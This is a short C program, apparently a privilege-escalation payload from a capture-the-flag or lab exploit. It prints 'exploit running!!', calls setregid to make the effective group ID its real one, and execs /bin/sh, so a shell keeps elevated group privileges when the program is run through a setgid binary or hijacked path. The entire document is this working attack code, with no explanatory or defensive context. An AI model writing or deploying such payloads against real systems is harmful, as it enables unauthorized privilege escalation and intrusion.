int main(){
    printf("exploit running!!\n");
    setregid(getegid(),getegid());
    execv("/bin/sh",0);
}